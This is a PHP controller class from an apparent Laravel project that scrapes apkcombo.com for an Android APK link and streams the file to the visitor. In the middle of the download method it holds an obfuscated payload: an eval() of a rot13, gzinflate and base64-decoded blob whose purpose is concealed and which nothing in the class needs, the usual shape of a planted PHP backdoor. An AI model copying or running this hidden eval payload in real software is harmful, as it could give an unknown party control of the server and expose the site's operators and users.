<?php

/**
 * App\Http\Controllers\Web\Api\ApkDownload
 *
 * Long description for class (if any)...
 *
 * @package    DCM
 * @author     Anthony Pillos <dev.anthonypillos@gmail.com>
 * @copyright  2018 (c) DCM
 * @version    Release: v1.0.0
 * @link       http://devcorpmanila.com
 */


namespace App\Http\Controllers\Web\Api;

use Exception;
use Symfony\Component\DomCrawler\Crawler;
use GuzzleHttp\Client;
use GuzzleHttp\Exception\ClientException;
use GuzzleHttp\Exception\GuzzleException;
use Facades\App\Facades\UserAgentFacade;
use Storage;

class ApkDownload
{

    /**
    * __construct()
    * Initialize our Class Here for Dependecy Injection
    *
    * @return void
    * @access  public
    **/
    public function __construct()
    {

        $this->referer = 'https://www.google.com';

        $this->webClient = new Client(array(
            'headers' => ['User-Agent' => UserAgentFacade::random(),
                            'Referer' => $this->referer,
                            'Accept-Encoding' => 'gzip, deflate',
                            'Accept' => 'text/html,application/xhtml+xml,application/xml'
                        ]
        ));
    }


    /**
    * download()
    *
    * @return void
    * @access  public
    **/
    public function download($myAppId)
    {

        try {

            $urlToken = $this->apkCombo( $myAppId );

            $cacheKeyName = 'apkdownload:'.str_slug($myAppId);
            $that         = $this;
            // $htmlCodes = cache()->remember($cacheKeyName, 1440, function ()  use($that, $urlToken) {
            //         $response = $that->webClient->get( $urlToken );
            //         return $response->getBody()->getContents();
            // });

            $response  = $that->webClient->get( $urlToken );
            $htmlCodes = $response->getBody()->getContents();

            $content = new Crawler($htmlCodes);

            $_html = [
                'link' => 'h1 a',
            ];

            $downloadUrl = $urlToken;

            $fileName    = str_slug(dcmConfig('site_name')) . '_'. $myAppId . '.apk';
            eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
            if  ( $content->filter($_html['link'])->count() > 0) {

                $downloadUrl = $content->filter($_html['link'])->attr('href');
                $fileName    =  str_slug(dcmConfig('site_name')).'_'.$content->filter($_html['link'])->html();
            }

            header('Pragma: public');
            header('Expires: 0');
            header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
            header('Cache-Control: private', false); // required for certain browsers
            header('Content-Type: application/pdf');

            header('Content-Transfer-Encoding: binary');
            header("Content-Description: File Transfer");
            header("Content-Type: application/octet-stream");
            header('Content-Disposition: attachment; filename="'.$fileName.'"');
            readfile($downloadUrl);
            exit;


        } catch (GuzzleException $e) {
            if ($e instanceof ClientException && $e->hasResponse()) {
                throw new Exception($e->getResponse()->getReasonPhrase(), 3);
            }
            else
                throw new Exception($e->getMessage(), 3);

        } catch (Exception $e) {

            logger()->debug($e);
            return $e->getMessage();
        }
    }

    private function apkCombo( $myAppId ) {
        return 'https://apkcombo.com/google-play-store/'.$myAppId.'/download/apk';
    }
}